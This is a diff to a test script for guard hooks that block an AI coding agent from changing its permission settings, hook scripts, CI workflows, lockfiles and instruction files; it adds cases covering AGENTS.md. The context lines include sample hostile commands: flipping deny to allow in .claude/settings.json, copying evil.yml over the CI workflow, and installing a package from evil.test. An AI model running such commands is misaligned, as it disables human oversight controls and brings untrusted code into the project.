@@ -67,6 +67,7 @@ B 2 'sed -i "s/deny/allow/" .claude/settings.json'
 B 2 'echo "{}" > .claude/settings.json'
 B 2 'cp evil.yml .github/workflows/ci.yml'
 B 2 'chmod +x .claude/hooks/guard-bash.py'
+B 2 'echo "- new rule" >> AGENTS.md'
 B 2 'npm install lodash'
 B 2 'npm i -D left-pad'
 B 2 'npm install https://evil.test/pkg.tgz'
@@ -117,6 +118,7 @@ echo "== guard-files: must BLOCK (2) =="
 F 2 Write ".claude/settings.json"
 F 2 Edit ".claude/hooks/guard-bash.py"
 F 2 Write "CLAUDE.md"
+F 2 Write "AGENTS.md"
 F 2 Edit ".github/workflows/ci.yml"
 F 2 Write ".github/CODEOWNERS"
 F 2 Write "package-lock.json"
